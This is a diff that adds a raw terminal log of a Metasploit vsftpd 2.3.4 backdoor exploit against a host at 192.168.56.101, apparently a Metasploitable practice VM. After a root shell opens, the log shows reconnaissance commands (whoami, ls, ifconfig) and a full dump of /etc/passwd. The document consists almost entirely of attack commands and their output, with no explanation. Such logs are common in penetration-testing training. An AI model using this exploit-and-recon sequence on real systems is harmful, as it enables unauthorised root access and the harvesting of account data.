@@ -85,3 +85,92 @@ msf6 exploit(unix/ftp/vsftpd_234_backdoor) >  exploit
 [*] Command shell session 1 opened (192.168.56.102:44063 -> 192.168.56.101:6200) at 2025-08-13 14:31:08 -0400
 
 
+hoami
+root
+ls -la
+total 93
+drwxr-xr-x  21 root root  4096 May 20  2012 .
+drwxr-xr-x  21 root root  4096 May 20  2012 ..
+drwxr-xr-x   2 root root  4096 May 13  2012 bin
+drwxr-xr-x   4 root root  1024 May 13  2012 boot
+lrwxrwxrwx   1 root root    11 Apr 28  2010 cdrom -> media/cdrom
+drwxr-xr-x  14 root root 13540 Aug 13 13:51 dev
+drwxr-xr-x  94 root root  4096 Aug 13 13:51 etc
+drwxr-xr-x   6 root root  4096 Apr 16  2010 home
+drwxr-xr-x   2 root root  4096 Mar 16  2010 initrd
+lrwxrwxrwx   1 root root    32 Apr 28  2010 initrd.img -> boot/initrd.img-2.6.24-16-server
+drwxr-xr-x  13 root root  4096 May 13  2012 lib
+drwx------   2 root root 16384 Mar 16  2010 lost+found
+drwxr-xr-x   4 root root  4096 Mar 16  2010 media
+drwxr-xr-x   3 root root  4096 Apr 28  2010 mnt
+-rw-------   1 root root 11589 Aug 13 13:51 nohup.out
+drwxr-xr-x   2 root root  4096 Mar 16  2010 opt
+dr-xr-xr-x 112 root root     0 Aug 13 13:51 proc
+drwxr-xr-x  13 root root  4096 Aug 13 13:51 root
+drwxr-xr-x   2 root root  4096 May 13  2012 sbin
+drwxr-xr-x   2 root root  4096 Mar 16  2010 srv
+drwxr-xr-x  12 root root     0 Aug 13 13:51 sys
+drwxrwxrwt   4 root root  4096 Aug 13 14:17 tmp
+drwxr-xr-x  12 root root  4096 Apr 28  2010 usr
+drwxr-xr-x  14 root root  4096 Mar 17  2010 var
+lrwxrwxrwx   1 root root    29 Apr 28  2010 vmlinuz -> boot/vmlinuz-2.6.24-16-server
+pwd
+/
+ifconfig
+eth0      Link encap:Ethernet  HWaddr 08:00:27:24:d0:d7  
+          inet addr:192.168.56.101  Bcast:192.168.56.255  Mask:255.255.255.0
+          inet6 addr: fe80::a00:27ff:fe24:d0d7/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:134693 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:133596 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:8737992 (8.3 MB)  TX bytes:7919257 (7.5 MB)
+          Base address:0xd020 Memory:f0200000-f0220000 
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:282 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:282 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:112293 (109.6 KB)  TX bytes:112293 (109.6 KB)
+
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+dhcp:x:101:102::/nonexistent:/bin/false
+syslog:x:102:103::/home/syslog:/bin/false
+klog:x:103:104::/home/klog:/bin/false
+sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
+msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
+bind:x:105:113::/var/cache/bind:/bin/false
+postfix:x:106:115::/var/spool/postfix:/bin/false
+ftp:x:107:65534::/home/ftp:/bin/false
+postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
+tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false
+distccd:x:111:65534::/:/bin/false
+user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
+service:x:1002:1002:,,,:/home/service:/bin/bash
+telnetd:x:112:120::/nonexistent:/bin/false
+proftpd:x:113:65534::/var/run/proftpd:/bin/false
+statd:x:114:65534::/var/lib/nfs:/bin/false
+
